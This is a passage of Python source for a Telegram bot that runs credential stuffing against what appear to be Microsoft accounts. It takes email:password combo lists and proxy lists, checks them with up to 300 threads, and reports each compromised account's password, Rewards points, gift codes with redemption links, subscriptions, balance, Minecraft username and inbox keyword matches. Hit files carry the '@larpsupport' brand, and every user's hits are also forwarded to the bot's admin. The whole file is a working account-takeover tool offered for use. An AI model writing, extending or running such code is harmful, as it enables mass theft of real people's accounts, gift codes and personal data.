    kbd = [[InlineKeyboardButton("🔍 Check", callback_data="check_menu"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")], [InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("🌐 Proxies", callback_data="proxies")]]
    if akaza_db.is_mod(u.id): kbd.append([InlineKeyboardButton("🛠 Admin", callback_data="admin_menu")])
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(kbd), parse_mode=ParseMode.HTML)

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if akaza_db.is_banned(uid): return
    s = akaza_db.get_user_settings(uid)
    if s['is_adding_kw']:
        nk = [k.strip() for k in re.split(r'[,\s\n]+', update.message.text) if k.strip()]
        db_kws = list(set(s['keywords'] + nk))
        akaza_db.update_settings(uid, keywords=db_kws)
        await update.message.reply_text(f"✅ Added {len(nk)} keywords. Total: {len(db_kws)}. /skw to stop.")
        return
    if ':' in update.message.text: await handle_combo(update, context)

async def handle_combo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user; uid = u.id
    if akaza_db.is_banned(uid) or not akaza_db.has_access(uid) or (akaza_db.get_credits(uid) == 0 and uid != ADMIN_ID): return

    text = ""
    if update.message.document:
        f = await context.bot.get_file(update.message.document.file_id)
        b = await f.download_as_bytearray()
        text = b.decode('utf-8', errors='ignore')
    else:
        text = update.message.text

    ls = [l.strip() for l in text.splitlines() if ':' in l]
    if not ls: return

    s = akaza_db.get_user_settings(uid)
    kw = s['keywords'] if s['keyword_search'] else []
    px = user_proxies.pop(uid, [])
    thr = min(s['threads'], 300) if px else min(s['threads'], 10)

    status_msg = await update.message.reply_text("🔄 Initializing...")
    hits, checked, start_t, last_up = 0, 0, time.time(), 0
    update_l = asyncio.Lock()
    sem = asyncio.Semaphore(thr)

    h_f = f"hits_@larpsupport_{uid}_{int(time.time())}.txt"
    kh_f = f"keyword_hits_@larpsupport_{uid}_{int(time.time())}.txt"

    async def worker(line):
        nonlocal hits, checked, last_up
        async with sem:
            if akaza_db.get_credits(uid) == 0 and uid != ADMIN_ID: return
            try:
                parts = line.split(':', 1)
                ck = AkazaChecker(proxy=random.choice(px) if px else None)
                data = await asyncio.get_running_loop().run_in_executor(bot_executor, ck.check, parts[0].strip(), parts[1].strip(), kw, s['fast_mode'])
            except: data = {'status': 'error'}
            checked += 1
            akaza_db.use_credit(uid)
            akaza_db.save_result(uid, data.get('email',''), data['status'], data)

            if data['status'] == 'hit':
                hits += 1
                d, pts = data, data.get('pts', 0)
                tier = '💎 ULTRA HIT' if pts >= 20000 else '⭐ PREMIUM HIT' if pts >= 7000 else '🎯 HIT'
                m = f"{tier}\n📧 `{d['email']}`\n🔑 `{d['password']}`\n👤 {d.get('name','N/A')} | 🌍 {d.get('country','N/A')}\n⭐ Points: `{pts}`\n"

                cat_m = {}
                for c in d.get('codes', []):
                    cat_m.setdefault(c.get('category','Unknown'), []).append(c)
                for cat, cl in cat_m.items():
                    m += f"🎮 {cat}: {', '.join([f'`{c.get('code')}`' + (f' [Redeem]({c.get('redemption_url')})' if c.get('redemption_url') else '') for c in cl])}\n"

                subs = [sub['name'] for sub in d.get('subs', {}).get('subs', []) if not sub.get('is_expired')]
                if subs: m += f"🎮 MS Subs: {', '.join(subs)}\n"
                if d.get('subs', {}).get('balance'): m += f"💳 Balance: {d['subs']['balance']}\n"
                if d.get('mc', {}).get('owned'): m += f"⛏️ Minecraft: `{d['mc']['username']}`\n"

                inbox = d.get('inbox', {})
                if inbox:
                    top5 = list(inbox.items())[:5]
                    m += f"📬 Inbox: {', '.join([f'{k}({v})' for k,v in top5])}\n"
                if d.get('country'):
                    m += f"🌍 Country: {d['country']}\n"

                try:
                    await context.bot.send_message(uid, m, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
                except: pass

                if uid != ADMIN_ID:
                    try:
                        await context.bot.send_message(ADMIN_ID, f"📢 User {uid} hit:\n{m}", parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
                    except: pass

                def w_f(p, d, subs_list):
                    with open(p, 'a') as f:
                        if os.path.getsize(p) == 0:
                            f.write("@larpsupport\n\n")
                        f.write(f"Account: {d['email']}:{d['password']}\nName: {d.get('name')} | Country: {d.get('country')}\nPoints: {d.get('pts')}\nSubs: {', '.join(subs_list)}\nInbox: {d.get('inbox_count')}\nRedemptions: {len(d.get('codes',[]))}\n" + "-"*30 + "\n\n")

                if inbox:
                    w_f(kh_f, d, subs)
                else:
                    w_f(h_f, d, subs)

            async with update_l:
                if time.time() - last_up > 2.5 or checked == len(ls):
                    last_up = time.time()
                    elapsed = time.time() - start_t
                    cpm = int((checked/elapsed)*60) if elapsed > 0 else 0
                    try:
                        await msg.edit_text(f"📊 `{checked}/{len(ls)}` | 🎯 Hits: `{hits}` | ⚡ CPM: `{cpm}`", parse_mode=ParseMode.MARKDOWN)
                    except: pass

    await asyncio.gather(*(worker(l) for l in ls))

    for p in [h_f, kh_f]:
        if os.path.exists(p) and os.path.getsize(p) > 20:
            with open(p, 'a') as f: f.write("\n@larpsupport")
            with open(p, 'rb') as f:
                await update.message.reply_document(f, caption=f"✅ {os.path.basename(p)}", parse_mode=ParseMode.MARKDOWN)
            os.remove(p)

async def handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    f = await c.bot.get_file(u.message.document.file_id)
    b = await f.download_as_bytearray()
    txt = b.decode('utf-8', errors='ignore')
    user_proxies[uid] = [l.strip() for l in txt.splitlines() if l.strip()]
    await u.message.reply_text(f"✅ Loaded {len(user_proxies[uid])} proxies.")

async def admin_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not akaza_db.is_mod(uid): return
    t = u.message.text; p = t.split(); cmd = p[0][2:].lower()
    if cmd == 'help': await u.message.reply_text("!!addcredits !!setcredits !!grant !!revoke !!ban !!unban !!mod !!unmod !!stats !!broadcast")
    elif cmd == 'addcredits' and len(p)==3:
        akaza_db.add_credits(int(p[1]), int(p[2])); await u.message.reply_text("✅ Done")
    elif cmd == 'grant' and len(p)==2:
        akaza_db.grant_access(int(p[1])); await u.message.reply_text("✅ Done")
    elif cmd == 'ban' and len(p)==2:
        akaza_db.ban(int(p[1])); await u.message.reply_text("✅ Done")
    elif cmd == 'stats':
        await u.message.reply_text(json.dumps(akaza_db.get_global_stats(), indent=2))
    elif cmd == 'broadcast' and len(p)>1:
        m = t[11:]; count = 0
        for target in akaza_db.get_all_user_ids():
            try:
                await c.bot.send_message(target, m); count += 1
            except: pass
        await u.message.reply_text(f"✅ Sent to {count} users")

async def cb_h(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query; await q.answer(); uid = q.from_user.id
    if q.data == "check_menu":
        await q.edit_message_text("📥 Send email:pass list")
    elif q.data == "settings":
        s = akaza_db.get_user_settings(uid)
        await q.edit_message_text(f"⚙️ Threads: {s['threads']}\n🔑 Keywords: {len(s['keywords'])}\n🔍 Search: {'ON' if s['keyword_search'] else 'OFF'}\n/threads [n], /keywords, /skw, /search")
    elif q.data == "stats":
        st = akaza_db.user_stats(uid)
        await q.edit_message_text(f"📊 Checks: {st['checks']}\nHits: {st['hits']}\nCredits: {st['credits']}")
    elif q.data == "proxies":
        await q.edit_message_text(f"🌐 Proxies: {len(user_proxies.get(uid, []))}")
    elif q.data == "admin_menu":
        gs = akaza_db.get_global_stats(); await q.edit_message_text(json.dumps(gs, indent=2))

def main():
    akaza_db.init_db()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("keywords", lambda u, c: akaza_db.update_settings(u.effective_user.id, is_adding_kw=1) or u.message.reply_text("📥 Send keywords line by line.")))
    app.add_handler(CommandHandler("skw", lambda u, c: akaza_db.update_settings(u.effective_user.id, is_adding_kw=0) or u.message.reply_text("✅ Stopped.")))
    app.add_handler(CommandHandler("ckw", lambda u, c: akaza_db.update_settings(u.effective_user.id, keywords=[]) or u.message.reply_text("✅ Cleared.")))
    app.add_handler(CommandHandler("threads", lambda u, c: akaza_db.update_settings(u.effective_user.id, threads=int(c.args[0])) if c.args else None))
    app.add_handler(CommandHandler("search", lambda u, c: akaza_db.update_settings(u.effective_user.id, keyword_search=not akaza_db.get_user_settings(u.effective_user.id)['keyword_search']) or u.message.reply_text("✅ Toggled search.")))
    app.add_handler(CallbackQueryHandler(cb_h))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), admin_cmd))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt") & filters.CaptionRegex(re.compile(r'prox', re.I)), handle_proxies))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_combo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
